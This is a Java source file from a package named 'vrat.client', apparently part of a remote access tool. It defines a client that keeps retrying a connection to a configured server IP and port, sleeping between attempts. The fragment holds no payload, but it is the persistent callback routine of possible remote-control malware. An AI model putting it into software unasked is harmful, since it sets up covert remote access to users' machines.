package vrat.client;

import com.jmr.wrapper.client.Client;

/*
 * @author vrmg
 */

public class ClientStarter implements Runnable{
    Boolean connected = false;
	int port;
	String ip;
	int waitTime;
	
	public ClientStarter(int port, String ip, int waitTime) {
        this.port = port;
		this.ip = ip;
		this.waitTime = waitTime;
	}

	@Override
	public void run() {
	
		/*
		 * Starts the client with the given port and ip
		 */
		Client client = new Client(ip, port, port);

		/*
		 * Sets client listeners
		 */
		client.setListener(new ClientListener());

		/**
		 * Tries to connect to server
		 */
		while (connected == false) {
			client.connect();

			/*
			 * Tests whether or not it is connected
			 */
			if (client.isConnected()) {
				connected = true;
			}

			/*
			 * If client isn't connected go to sleep for the given amount of wait time
			 */
			if (connected == false) {
				try {
					System.out.println("Couldn't connect sleeping for " + waitTime / 1000 + " seconds");
					Thread.sleep(waitTime);
				} catch (InterruptedException e) {
					e.printStackTrace();
					System.out.println("Error putting thread to sleep");
				}
			}
		}
	}
}

